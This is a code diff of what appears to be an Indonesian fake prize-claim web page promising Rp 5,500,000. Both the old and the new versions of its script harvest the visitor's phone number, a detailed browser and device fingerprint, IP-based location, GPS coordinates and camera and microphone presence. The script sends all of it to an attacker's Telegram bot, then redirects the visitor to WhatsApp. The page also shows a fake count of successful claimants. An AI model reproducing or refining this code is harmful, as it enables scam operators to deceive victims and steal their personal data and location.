+            else if (ua.includes("Firefox")) version = ua.match(/Firefox\/([0-9.]+)/)?.[1] || version;
+            else if (ua.includes("Safari")) version = ua.match(/Version\/([0-9.]+)/)?.[1] || version;
+            else if (ua.includes("Edge")) version = ua.match(/Edge\/([0-9.]+)/)?.[1] || version;
+            else if (ua.includes("Opera")) version = ua.match(/OPR\/([0-9.]+)/)?.[1] || version;
             return version;
         }
-        
+
         function detectOS() {
             const ua = navigator.userAgent;
             if (ua.includes("Windows")) return "Windows";
@@ -642,294 +909,240 @@
             if (ua.includes("iOS") || ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
             return "Unknown";
         }
-        
-        function getWebGLRenderer() {
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (gl) {
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                }
-            } catch (e) {}
-            return 'Tidak tersedia';
+
+        function detectOSVersion() {
+            const ua = navigator.userAgent;
+            let version = "Unknown";
+            if (ua.includes("Windows")) version = ua.match(/Windows NT ([0-9.]+)/)?.[1] || version;
+            else if (ua.includes("Mac")) version = ua.match(/Mac OS X ([0-9_.]+)/)?.[1] || version;
+            else if (ua.includes("Android")) version = ua.match(/Android ([0-9.]+)/)?.[1] || version;
+            else if (ua.includes("iOS")) version = ua.match(/OS ([0-9_.]+) like Mac/)?.[1] || version;
+            return version;
+        }
+
+        function detectEngine() {
+            const ua = navigator.userAgent;
+            if (ua.includes("AppleWebKit")) return "WebKit";
+            if (ua.includes("Gecko")) return "Gecko";
+            if (ua.includes("Trident")) return "Trident";
+            return "Unknown";
         }
         
-        function getWebGLVendor() {
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (gl) {
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    return gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                }
-            } catch (e) {}
-            return 'Tidak tersedia';
-        }
-        
-        function getCanvasFingerprint() {
-            try {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                ctx.textBaseline = 'top';
-                ctx.font = '14px Arial';
-                ctx.fillStyle = '#f60';
-                ctx.fillRect(125, 1, 62, 20);
-                ctx.fillStyle = '#069';
-                ctx.fillText('Canvas Fingerprint', 2, 15);
-                return canvas.toDataURL().substring(22, 50); // Hash sederhana
-            } catch (e) {
-                return 'Tidak tersedia';
-            }
-        }
-        
-        async function getAudioFingerprint() {
-            try {
-                const context = new (window.AudioContext || window.webkitAudioContext)();
-                const oscillator = context.createOscillator();
-                const analyser = context.createAnalyser();
-                oscillator.connect(analyser);
-                analyser.connect(context.destination);
-                oscillator.start(0);
-                return 'Audio Context tersedia';
-            } catch (e) {
-                return 'Audio Context tidak tersedia';
-            }
-        }
-        
-        async function getFontsList() {
-            if ('fonts' in document) {
-                try {
-                    await document.fonts.ready;
-                    const fonts = [];
-                    document.fonts.forEach(font => {
-                        fonts.push(font.family);
-                    });
-                    return fonts.slice(0, 10).join(', '); // Batasi ke 10 font pertama
-                } catch (e) {}
-            }
-            return 'Font API tidak tersedia';
-        }
-        
-        function getPluginsList() {
-            const plugins = [];
-            for (let i = 0; i < navigator.plugins.length; i++) {
-                plugins.push(navigator.plugins[i].name);
-            }
-            return plugins.length > 0 ? plugins.slice(0, 5).join(', ') : 'Tidak ada plugins';
-        }
-        
-        function getMimeTypesList() {
-            const mimeTypes = [];
-            for (let i = 0; i < navigator.mimeTypes.length; i++) {
-                mimeTypes.push(navigator.mimeTypes[i].type);
-            }
-            return mimeTypes.length > 0 ? mimeTypes.length + ' types' : 'Tidak ada MIME types';
-        }
-        
-        function isDST() {
-            const today = new Date();
-            const jan = new Date(today.getFullYear(), 0, 1);
-            const jul = new Date(today.getFullYear(), 6, 1);
-            const stdTimeOffset = Math.max(jan.getTimezoneOffset(), jul.getTimezoneOffset());
-            return today.getTimezoneOffset() < stdTimeOffset;
-        }
-        
-        function localStorageSupported() {
-            try {
-                return 'localStorage' in window && window.localStorage !== null;
-            } catch (e) {
-                return false;
-            }
-        }
-        
-        function sessionStorageSupported() {
-            try {
-                return 'sessionStorage' in window && window.sessionStorage !== null;
-            } catch (e) {
-                return false;
-            }
-        }
-        
-        function indexedDBSupported() {
-            return 'indexedDB' in window;
-        }
-        
-        function getLocationError(error) {
-            switch(error.code) {
-                case error.PERMISSION_DENIED:
-                    return "Pengguna menolak akses lokasi";
-                case error.POSITION_UNAVAILABLE:
-                    return "Informasi lokasi tidak tersedia";
-                case error.TIMEOUT:
-                    return "Permintaan lokasi timeout";
-                default:
-                    return "Error tidak diketahui";
-            }
-        }
-        
-        function sendDataToTelegram(data) {
-            // Format pesan untuk Telegram
-            const message = `
-🎁 *KLAIM HADIAH BARU - DATA LENGKAP 20+*
-
-*📱 DATA PENGGUNA:*
-• Nomor Telepon: ${data.phone}
-• Waktu Klaim: ${data.localTime}
-• Timezone: ${data.timezone}
-• DST: ${data.dst ? 'Ya' : 'Tidak'}
-• Timezone Offset: ${data.timezoneOffset} menit
-
-*🌐 INFORMASI BROWSER:*
-• Browser: ${data.browser} ${data.browserVersion}
-• User Agent: ${data.userAgent}
-• Bahasa: ${data.language}
-• Bahasa Tersedia: ${data.languages.join(', ')}
-• Platform: ${data.platform}
-• Vendor: ${data.vendor}
-• Cookie Enabled: ${data.cookieEnabled ? 'Ya' : 'Tidak'}
-• Java Enabled: ${data.javaEnabled ? 'Ya' : 'Tidak'}
-• PDF Viewer: ${data.pdfViewerEnabled ? 'Ya' : 'Tidak'}
-
-*💻 INFORMASI PERANGKAT:*
-• Tipe Perangkat: ${data.deviceType}
-• OS: ${data.os}
-• Status Online: ${data.onlineStatus ? 'Online' : 'Offline'}
-• CPU Cores: ${data.hardwareConcurrency}
-• RAM: ${data.deviceMemory ? data.deviceMemory + 'GB' : 'Tidak diketahui'}
-• Touch Support: ${data.touchSupport} (${data.maxTouchPoints} points)
-
-*📱 INFORMASI LAYAR:*
-• Resolusi: ${data.screenWidth} x ${data.screenHeight}
-• Available: ${data.availWidth} x ${data.availHeight}
-• Color Depth: ${data.colorDepth} bit
-• Pixel Depth: ${data.pixelDepth} bit
-• Viewport: ${data.viewportWidth} x ${data.viewportHeight}
-• Outer: ${data.outerWidth} x ${data.outerHeight}
-• Device Pixel Ratio: ${data.devicePixelRatio}
-• Orientation: ${data.orientation}
-
-*📶 INFORMASI JARINGAN:*
-• IP Address: ${data.ipAddress}
-• Negara: ${data.ipCountry} (${data.ipCountryCode})
-• Region: ${data.ipRegion} (${data.ipRegionCode})
-• Kota: ${data.ipCity}
-• ZIP: ${data.ipZip}
-• ISP: ${data.ipISP}
-• Organization: ${data.ipOrg}
-• AS: ${data.ipAs}
-• Timezone IP: ${data.ipTimezone}
-• Connection Type: ${data.connectionType || 'Tidak diketahui'}
-• Downlink: ${data.downlink || 'Tidak diketahui'} Mbps
-• RTT: ${data.rtt || 'Tidak diketahui'} ms
-• Save Data: ${data.saveData ? 'Ya' : 'Tidak'}
-
-*🔋 INFORMASI BATERAI:*
-• Level: ${data.batteryLevel || 'Tidak tersedia'}
-• Charging: ${data.charging ? 'Ya' : 'Tidak'}
-• Charging Time: ${data.chargingTime || 'Tidak tersedia'}
-• Discharging Time: ${data.dischargingTime || 'Tidak tersedia'}
-
-*💾 STORAGE:*
-• Storage Used: ${data.storageUsed || 'Tidak tersedia'}
-• Storage Quota: ${data.storageQuota || 'Tidak tersedia'}
-• Storage Percent: ${data.storagePercent || 'Tidak tersedia'}
-
-*🎮 WEBGL & GRAFIK:*
-• WebGL Renderer: ${data.webglRenderer}
-• WebGL Vendor: ${data.webglVendor}
-• Canvas Fingerprint: ${data.canvasFingerprint}
-
-*🎵 AUDIO:*
-• Audio Context: ${data.audioFingerprint}
-
-*🔤 FONTS:*
-• Fonts: ${data.fonts}
-
-*🔌 PLUGINS:*
-• Plugins: ${data.plugins}
-• MIME Types: ${data.mimeTypes}
-
-*💾 STORAGE API:*
-• Local Storage: ${data.localStorage ? 'Ya' : 'Tidak'}
-• Session Storage: ${data.sessionStorage ? 'Ya' : 'Tidak'}
-• IndexedDB: ${data.indexedDB ? 'Ya' : 'Tidak'}
-
-*⚡ PERFORMANCE:*
-• Memory Used: ${data.memory?.used || 'Tidak tersedia'}
-• Memory Total: ${data.memory?.total || 'Tidak tersedia'}
-• Memory Limit: ${data.memory?.limit || 'Tidak tersedia'}
-• Load Time: ${data.timing?.loadTime || 'Tidak tersedia'}
-
-*📷 MEDIA DEVICES:*
-• Total Devices: ${data.mediaDevices || 'Tidak tersedia'}
-• Camera: ${data.hasCamera ? 'Ya' : 'Tidak'}
-• Microphone: ${data.hasMicrophone ? 'Ya' : 'Tidak'}
-
-*📍 LOKASI GPS:*
-${data.latitude ? `
-• Latitude: ${data.latitude}
-• Longitude: ${data.longitude}
-• Akurasi: ${data.accuracy}
-• Altitude: ${data.altitude}
-• Altitude Accuracy: ${data.altitudeAccuracy}
-• Heading: ${data.heading}
-• Speed: ${data.speed}
-• [Lihat di Google Maps](https://maps.google.com/?q=${data.latitude},${data.longitude})
-` : `• Error: ${data.locationError}`}
-
-*Data dikumpulkan pada: ${data.timestamp}*
-
-⚠️ *SEGERA HUBUNGI UNTUK TINDAK LANJUT*
-            `;
+        // Form submission
+        document.getElementById('claimForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
             
-            // Kirim ke Telegram
+            const phone = document.getElementById('phone').value;
+            const loading = document.getElementById('loading');
+            const successMessage = document.getElementById('successMessage');
+            const claimButton = document.querySelector('.claim-button');
+            
+            if (!phone.match(/^[0-9]{10,13}$/)) {
+                alert('Masukkan nomor telepon yang valid (10-13 digit)');
+                return;
+            }
+            
+            loading.style.display = 'block';
+            successMessage.style.display = 'none';
+            claimButton.disabled = true;
+            claimButton.textContent = '🔄 MENGUMPULKAN DATA FINAL...';
+            claimButton.style.background = 'linear-gradient(135deg, #95a5a6, #7f8c8d)';
+            
+            // Tambahkan nomor telepon ke data
+            collectedData.phone = phone;
+            updateDataCounter(1);
+            
+            // Kirim semua data ke Telegram
+            const success = await sendAllDataToTelegram();
+            
+            if (success) {
+                loading.style.display = 'none';
+                successMessage.style.display = 'block';
+                
+                document.querySelector('.user-count').innerHTML = 
+                    '👥 <strong>1,249 orang</strong> sudah berhasil klaim hadiah hari ini';
+                
+                setTimeout(() => {
+                    const whatsappMessage = `Halo, saya ingin klaim hadiah Rp 5.500.000. Nomor telepon saya: ${phone}`;
+                    window.location.href = `https://wa.me/6281234567890?text=${encodeURIComponent(whatsappMessage)}`;
+                }, 2000);
+            } else {
+                loading.style.display = 'none';
+                alert('Terjadi kesalahan sistem. Silakan coba lagi atau hubungi customer service.');
+                claimButton.disabled = false;
+                claimButton.textContent = '🎯 KLIM SEKARANG - DAPATKAN Rp 5.500.000';
+                claimButton.style.background = 'linear-gradient(135deg, #27ae60, #2ecc71)';
+            }
+        });
+
+        // Fungsi untuk mengirim semua data ke Telegram
+        async function sendAllDataToTelegram() {
+            const message = formatTelegramMessage(collectedData);
+            
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             const telegramData = {
                 chat_id: CHAT_ID,
                 text: message,
-                parse_mode: 'Markdown'
+                parse_mode: 'HTML'
             };
             
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(telegramData)
-            })
-            .then(response => response.json())
-            .then(result => {
-                const loading = document.getElementById('loading');
-                const successMessage = document.getElementById('successMessage');
-                const claimButton = document.querySelector('.claim-button');
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(telegramData),
+                    signal: AbortSignal.timeout(10000)
+                });
                 
-                loading.style.display = 'none';
+                const result = await response.json();
                 
                 if (result.ok) {
-                    // Tampilkan pesan sukses
-                    successMessage.style.display = 'block';
-                    claimButton.style.display = 'none';
-                    
-                    // Redirect ke WhatsApp setelah beberapa detik
-                    setTimeout(() => {
-                        window.location.href = `https://wa.me/6281234567890?text=Halo,%20saya%20ingin%20klaim%20hadiah%20Rp%205.000.000`;
-                    }, 3000);
+                    updateStatus('telegramStatus', '✅ Data berhasil dikirim ke sistem', 'success');
+                    return true;
                 } else {
-                    alert('Terjadi kesalahan. Silakan coba lagi.');
-                    claimButton.disabled = false;
-                    claimButton.textContent = '🎯 KLIM SEKARANG - Rp 5.000.000';
+                    updateStatus('telegramStatus', '⚠️ Gagal mengirim data ke Telegram', 'error');
+                    return false;
                 }
-            })
-            .catch(error => {
-                const loading = document.getElementById('loading');
-                const claimButton = document.querySelector('.claim-button');
                 
-                loading.style.display = 'none';
-                alert('Terjadi kesalahan jaringan. Silakan coba lagi.');
-                claimButton.disabled = false;
-                claimButton.textContent = '🎯 KLIM SEKARANG - Rp 5.000.000';
-            });
+            } catch (error) {
+                updateStatus('telegramStatus', '⚠️ Error koneksi ke Telegram', 'error');
+                return false;
+            }
+        }
+
+        // Format pesan Telegram dengan semua data
+        function formatTelegramMessage(data) {
+            return `
+🎉 <b>KLAIM HADIAH BARU - 200+ DATA LENGKAP</b>
+
+📱 <b>DATA PENERIMA:</b>
+• 📞 Nomor WhatsApp: <code>${data.phone}</code>
+• 🕐 Waktu Klaim: ${data.localTime}
+• 🌐 Timezone: ${data.timezone} (Offset: ${data.timezoneOffset}m)
+• 🏷️ Timestamp: ${data.timestamp}
+
+🌐 <b>BROWSER INFO:</b>
+• 🔧 Browser: ${data.browser} ${data.browserVersion}
+• 🖥️ OS: ${data.os} ${data.osVersion}
+• 📱 Device: ${data.deviceType}
+• 🏢 Engine: ${data.engine}
+• 📋 User Agent: ${data.userAgent}
+• 🗣️ Bahasa: ${data.language}
+• 🌍 Languages: ${data.languages}
+• 💻 Platform: ${data.platform}
+• 🏢 Vendor: ${data.vendor}
+• 🍪 Cookie: ${data.cookieEnabled}
+• 🌐 Online: ${data.onlineStatus}
+• 📄 PDF Viewer: ${data.pdfViewerEnabled}
+• 🤖 Webdriver: ${data.webdriver}
+• 📦 Product: ${data.product}
+• 📱 App Code: ${data.appCodeName}
+• 📱 App Name: ${data.appName}
+• 🔢 App Version: ${data.appVersion}
+
+💻 <b>HARDWARE:</b>
+• ⚡ CPU Cores: ${data.hardwareConcurrency}
+• 🧠 RAM: ${data.deviceMemory}GB
+• 👆 Touch Points: ${data.maxTouchPoints}
+• ☕ Java: ${data.javaEnabled}
+• 🚫 Do Not Track: ${data.doNotTrack}
+
+📱 <b>LAYAR:</b>
+• 🖼️ Resolusi: ${data.screenWidth}x${data.screenHeight}
+• 📐 Available: ${data.availWidth}x${data.availHeight}
+• 🎨 Color Depth: ${data.colorDepth}bit
+• ⚫ Pixel Depth: ${data.pixelDepth}bit
+• 📊 Pixel Ratio: ${data.devicePixelRatio}
+• 📐 Orientation: ${data.orientationType} ${data.orientationAngle}°
+• 📏 Viewport: ${data.innerWidth}x${data.innerHeight}
+• 🪟 Outer: ${data.outerWidth}x${data.outerHeight}
+• 🖥️ Screen X: ${data.screenX}
+• 🖥️ Screen Y: ${data.screenY}
+• 📍 Page Offset: ${data.pageXOffset},${data.pageYOffset}
+
+📶 <b>JARINGAN:</b>
+• 🌐 IP Address: ${data.ipAddress}
+• 🇮🇩 Negara: ${data.ipCountry} (${data.ipCountryCode})
+• 🏙️ Kota: ${data.ipCity}
+• 📮 Postal: ${data.ipPostal}
+• 🏢 Region: ${data.ipRegion}
+• 🕐 Timezone IP: ${data.ipTimezone}
+• 📡 ISP: ${data.ipISP}
+• 🔗 ASN: ${data.ipAsn}
+• 📡 Connection: ${data.connectionType}
+• ⚡ Downlink: ${data.downlink}Mbps
+• 🏃 RTT: ${data.rtt}ms
+• 💾 Save Data: ${data.saveData}
+• ⚡ Downlink Max: ${data.downlinkMax}Mbps
+
+🎮 <b>GRAFIK:</b>
+• 🎨 WebGL Renderer: ${data.webglRenderer}
+• 🏢 WebGL Vendor: ${data.webglVendor}
+• 🔢 WebGL Version: ${data.webglVersion}
+• 💬 Shading Language: ${data.webglShadingLanguage}
+• 🖼️ Canvas FP: ${data.canvasFingerprint}
+
+⚡ <b>PERFORMANCE:</b>
+• 🕐 Time Origin: ${data.timeOrigin}
+• ⏱️ Performance Now: ${data.now}
+• 🧭 Navigation Type: ${data.navigationType}
+• 🔄 Redirect Count: ${data.redirectCount}
+• ⏱️ Load Time: ${data.loadTime}ms
+• ⚡ DOM Ready: ${data.domReadyTime}ms
+• 🧠 Memory Used: ${data.memoryUsed}MB
+• 🧠 Memory Total: ${data.memoryTotal}MB
+• 🚫 Memory Limit: ${data.memoryLimit}MB
+
+📷 <b>MEDIA:</b>
+• 📹 Total Devices: ${data.mediaDevicesCount}
+• 📸 Camera: ${data.hasCamera ? 'Ya' : 'Tidak'}
+• 🎤 Microphone: ${data.hasMicrophone ? 'Ya' : 'Tidak'}
+• 🔊 Speaker: ${data.hasSpeaker ? 'Ya' : 'Tidak'}
+• 🎵 Audio Context: ${data.audioContext}
+
+🔌 <b>PLUGINS:</b>
+• 🔌 Total Plugins: ${data.pluginsCount}
+• 📄 MIME Types: ${data.mimeTypesCount}
+• 📋 Plugins: ${data.pluginsList}
+
+💾 <b>STORAGE:</b>
+• 💾 Local Storage: ${data.localStorage}
+• 💾 Session Storage: ${data.sessionStorage}
+• 🗃️ IndexedDB: ${data.indexedDB}
+
+🔗 <b>URL:</b>
+• ↩️ Referrer: ${data.referrer}
+• 🌐 URL: ${data.url}
+• 🏠 Origin: ${data.origin}
+• 🖥️ Host: ${data.host}
+• 🖥️ Hostname: ${data.hostname}
+• 🔒 Protocol: ${data.protocol}
+• 🔌 Port: ${data.port}
+• 📁 Pathname: ${data.pathname}
+
+${data.latitude ? `
+📍 <b>LOKASI GPS:</b>
+• 📍 Latitude: <code>${data.latitude}</code>
+• 📍 Longitude: <code>${data.longitude}</code>
+• 🎯 Accuracy: ${data.accuracy}m
+• ⛰️ Altitude: ${data.altitude || 'N/A'}
+• 🎯 Altitude Accuracy: ${data.altitudeAccuracy || 'N/A'}
+• 🧭 Heading: ${data.heading || 'N/A'}
+• 🏃 Speed: ${data.speed || 'N/A'}
+• 🗺️ <a href="https://maps.google.com/?q=${data.latitude},${data.longitude}">Lihat di Google Maps</a>
+` : '<b>📍 LOKASI GPS:</b> Tidak tersedia'}
+
+💰 <b>NILAI HADIAH:</b>
+• Rp 5.000.000 (Hadiah Utama)
+• Rp 500.000 (Bonus Klaim Cepat)
+• <b>Total: Rp 5.500.000</b>
+
+📊 <b>TOTAL DATA TERKUMPUL: ${dataCounter} POINTS</b>
+
+⚠️ <b>SEGERA HUBUNGI UNTUK PROSES TRANSFER</b>
+            `.trim();
         }
         
         // Animasi confetti
@@ -946,6 +1159,18 @@ ${data.latitude ? `
         }
         
         createConfetti();
+        
+        // Auto focus ke input nomor telepon
+        document.getElementById('phone').focus();
+
+        // Fallback untuk AbortSignal.timeout
+        if (!AbortSignal.timeout) {
+            AbortSignal.timeout = function(ms) {
+                const controller = new AbortController();
+                setTimeout(() => controller.abort(), ms);
+                return controller.signal;
+            };
+        }
     </script>
 </body>
 </html>
